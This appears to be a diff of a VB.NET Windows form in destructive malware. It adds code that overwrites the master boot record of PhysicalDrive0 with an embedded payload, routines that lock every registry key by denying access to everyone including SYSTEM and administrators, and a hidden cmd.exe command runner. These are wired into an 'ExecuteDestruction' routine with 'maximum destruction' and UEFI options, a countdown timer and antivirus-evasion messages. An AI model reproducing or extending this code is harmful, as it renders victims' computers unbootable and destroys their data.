@@ -4,11 +4,10 @@ Imports System.Threading
 Imports Microsoft.Win32
 Imports System.ServiceProcess
 Imports System.Media
-
+Imports System.Runtime.InteropServices
+Imports System.Security.AccessControl
+Imports System.Security.Principal
 Public Class Form2
-
-    ' Correct declaration
-    Dim Form1d As New Form1()
 
     Public countdownTime As Integer = 60 ' Countdown timer in seconds
     Private ReadOnly audioPlayerd As New AudioPlayer()
@@ -362,6 +361,186 @@ Public Class Form2
 
     End Class
 
+    ' Constants
+    Private Const GenericWrite As UInteger = &H40000000
+    Private Const OpenExisting As UInteger = &H3
+    Private Const FileShareRead As UInteger = &H1
+    Private Const FileShareWrite As UInteger = &H2
+    Private Const MbrSize As UInteger = 512
+
+    ' API imports
+    <DllImport("kernel32")>
+    Private Shared Function CreateFile(
+        lpFileName As String,
+        dwDesiredAccess As UInteger,
+        dwShareMode As UInteger,
+        lpSecurityAttributes As IntPtr,
+        dwCreationDisposition As UInteger,
+        dwFlagsAndAttributes As UInteger,
+        hTemplateFile As IntPtr) As IntPtr
+    End Function
+
+    <DllImport("kernel32")>
+    Private Shared Function WriteFile(
+        hFile As IntPtr,
+        lpBuffer As Byte(),
+        nNumberOfBytesToWrite As UInteger,
+        ByRef lpNumberOfBytesWritten As UInteger,
+        lpOverlapped As IntPtr) As Boolean
+    End Function
+
+    <DllImport("kernel32")>
+    Private Shared Function CloseHandleForm2(hObject As IntPtr) As Boolean
+    End Function
+
+    Private Sub LockRegistryKeyForm2(keyPath As String)
+        Try
+            ' Open the registry key with permission to change security
+            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
+                If key IsNot Nothing Then
+                    ' Get the current security settings
+                    Dim security As RegistrySecurity = key.GetAccessControl()
+
+                    ' Remove all access to the key
+                    Dim everyone As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
+                    Dim system As New SecurityIdentifier(WellKnownSidType.LocalSystemSid, Nothing)
+                    Dim admins As New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing)
+
+                    ' Purge existing access rules
+                    security.PurgeAccessRules(everyone)
+                    security.PurgeAccessRules(system)
+                    security.PurgeAccessRules(admins)
+
+                    ' Remove all access rights for everyone, system, and admins
+                    security.AddAccessRule(New RegistryAccessRule(everyone, RegistryRights.FullControl, AccessControlType.Deny))
+                    security.AddAccessRule(New RegistryAccessRule(system, RegistryRights.FullControl, AccessControlType.Deny))
+                    security.AddAccessRule(New RegistryAccessRule(admins, RegistryRights.FullControl, AccessControlType.Deny))
+
+                    ' Apply the changes to the registry key
+                    key.SetAccessControl(security)
+                End If
+            End Using
+
+        Catch ex As Exception
+            MessageBox.Show("An error occurred while lock: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
+    End Sub
+
+    Private Sub LockRegistryKeyAndSubKeys(keyPath As String)
+        Try
+            ' Get the root key and open it
+            Dim rootKey As RegistryKey = Nothing
+            Dim keyParts As String() = keyPath.Split("\"c)
+            Select Case keyParts(0).ToUpper()
+                Case "HKEY_CLASSES_ROOT"
+                    rootKey = Registry.ClassesRoot
+                Case "HKEY_CURRENT_USER"
+                    rootKey = Registry.CurrentUser
+                Case "HKEY_LOCAL_MACHINE"
+                    rootKey = Registry.LocalMachine
+                Case "HKEY_USERS"
+                    rootKey = Registry.Users
+                Case "HKEY_CURRENT_CONFIG"
+                    rootKey = Registry.CurrentConfig
+                Case Else
+                    Throw New Exception("Unknown root key.")
+            End Select
+
+            ' Open the subkey with permission to change security
+            Using key As RegistryKey = rootKey.OpenSubKey(keyParts(1), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
+                If key IsNot Nothing Then
+                    ' Lock the root key itself
+                    LockRegistryKeyForm2(keyPath)
+
+                    ' Lock all subkeys
+                    For Each subKeyName In key.GetSubKeyNames()
+                        LockRegistryKeyAndSubKeys(keyPath & "\" & subKeyName)
+                    Next
+                End If
+            End Using
+        Catch ex As Exception
+            MessageBox.Show("An error occurred while locking registry key: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
+    End Sub
+
+    Private Function ExtractMbrToTempFile() As String
+        ' Create a temporary file
+        Dim tempFilePath As String = Path.GetTempFileName()
+
+        ' 3. Extract antivirusdefendermbr.bin from Resource1 (string to byte array conversion)
+        Dim mbrString As String = My.Resources.Resource1.antivirusdefendermbr
+        Dim mbrData As Byte() = Encoding.UTF8.GetBytes(mbrString)
+
+        ' Pad the byte array to 512 bytes with zeros if it's shorter
+        If mbrData.Length < 512 Then
+            Array.Resize(mbrData, 512)
+        End If
+
+        ' Ensure the last two bytes are 0x55 and 0xAA
+        mbrData(510) = &H55
+        mbrData(511) = &HAA
+
+        ' Write the MBR data to the temporary file
+        File.WriteAllBytes(tempFilePath, mbrData)
+
+        Return tempFilePath
+    End Function
+
+    Public Sub WriteMBR()
+        ' Extract MBR to a temporary file
+        Dim tempFilePath As String = ExtractMbrToTempFile()
+
+        ' Load the MBR data from the temporary file
+        Dim mbrData As Byte() = File.ReadAllBytes(tempFilePath)
+
+        If mbrData.Length <> MbrSize Then
+            MessageBox.Show("Invalid MBR data size.")
+            Return
+        End If
+
+        ' Open the disk for writing
+        Dim mbrHandle As IntPtr = CreateFile(
+        "\\.\PhysicalDrive0",
+        GenericWrite,
+        FileShareRead Or FileShareWrite,
+        IntPtr.Zero,
+        OpenExisting,
+        0,
+        IntPtr.Zero)
+
+        If mbrHandle = New IntPtr(-1) Then
+            MessageBox.Show("Run as administrator")
+            Return
+        End If
+
+        ' Write the MBR data to the disk
+        Dim bytesWritten As UInteger = 0
+        WriteFile(mbrHandle, mbrData, MbrSize, bytesWritten, IntPtr.Zero)
+        ' Close the handle
+        CloseHandleForm2(mbrHandle)
+
+        ' Delete the temporary file
+        If File.Exists(tempFilePath) Then
+            File.Delete(tempFilePath)
+        End If
+    End Sub
+
+    Public Sub LockAllRegistryKeys()
+        ' Define the root registry keys
+        Dim rootKeys As New List(Of String) From {
+        "HKEY_CLASSES_ROOT",
+        "HKEY_CURRENT_USER",
+        "HKEY_LOCAL_MACHINE",
+        "HKEY_USERS",
+        "HKEY_CURRENT_CONFIG"
+    }
+
+        ' Loop through each root registry key and lock them and their subkeys
+        For Each rootKey In rootKeys
+            LockRegistryKeyAndSubKeys(rootKey)
+        Next
+    End Sub
+
     ' Function to execute different payloads based on user choice
     Public Sub ExecuteDestruction(choice As String)
         ' Create an instance of the ComodoAntivirusDetector class
@@ -373,7 +552,7 @@ Public Class Form2
                     ' Code for maximum destruction
                     timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
                     Thread.Sleep(5000)
-                    Form1d.WriteMBR()
+                    WriteMBR()
                     ReplaceBootx64WithBootmgfw()
                     ApplyMaximumDestruction()
 
@@ -381,7 +560,7 @@ Public Class Form2
                     ' Code for classic UEFI effects
                     timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
                     Thread.Sleep(5000)
-                    Form1d.WriteMBR()
+                    WriteMBR()
                     ReplaceBootx64WithBootmgfw()
 
                 Case "Surprise Me"
@@ -404,7 +583,7 @@ Public Class Form2
                     ' Code for maximum destruction
                     timerLabel.Text = "Executing maximum destruction!"
                     Thread.Sleep(5000)
-                    Form1d.WriteMBR()
+                    WriteMBR()
                     ReplaceBootx64WithBootmgfw()
                     ApplyMaximumDestruction()
 
@@ -413,7 +592,7 @@ Public Class Form2
                     timerLabel.Text = "Executing classic UEFI effects!"
                     Thread.Sleep(5000)
                     ' Write UEFI using bootmgfw from Resource1
-                    Form1d.WriteMBR()
+                    WriteMBR()
                     ReplaceBootx64WithBootmgfw()
 
                 Case "Surprise Me"
@@ -431,7 +610,7 @@ Public Class Form2
                     Thread.Sleep(5000)
                     LegalNotice()
                     ApplyAccessRestrictions()
-                    Form1d.LockAllRegistryKeys()
+                    LockAllRegistryKeys()
                     Thread.Sleep(60000)
                     Environment.Exit(0)
 
@@ -462,6 +641,36 @@ Public Class Form2
         Return String.Empty
     End Function
 
+    ' Execute a system command
+    Public Sub ExecuteCommandForm2(command As String)
+        Try
+            Dim process As New Process()
+            process.StartInfo.FileName = "cmd.exe"
+            process.StartInfo.Arguments = "/C " & command
+            process.StartInfo.UseShellExecute = False
+            process.StartInfo.RedirectStandardOutput = True
+            process.StartInfo.RedirectStandardError = True
+            process.StartInfo.CreateNoWindow = True ' Do not create a window
+            process.Start()
+
+            ' Read the output and error streams
+            Dim output As String = process.StandardOutput.ReadToEnd()
+            Dim errorOutput As String = process.StandardError.ReadToEnd()
+
+            process.WaitForExit()
+
+            ' Output command results to console
+            If Not String.IsNullOrEmpty(output) Then
+                Console.WriteLine("Output: " & output)
+            End If
+            If Not String.IsNullOrEmpty(errorOutput) Then
+                Console.WriteLine("Error: " & errorOutput)
+            End If
+        Catch ex As Exception
+            Console.WriteLine("Command execution failed: " & ex.Message)
+        End Try
+    End Sub
+
     ' Apply access restrictions
     Private Sub ApplyAccessRestrictions()
         Dim commands As String() = {
@@ -481,7 +690,7 @@ Public Class Form2
 
         For Each command As String In commands
             Try
-                Form1d.ExecuteCommand(command)
+                ExecuteCommandForm2(command)
             Catch ex As Exception
                 MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
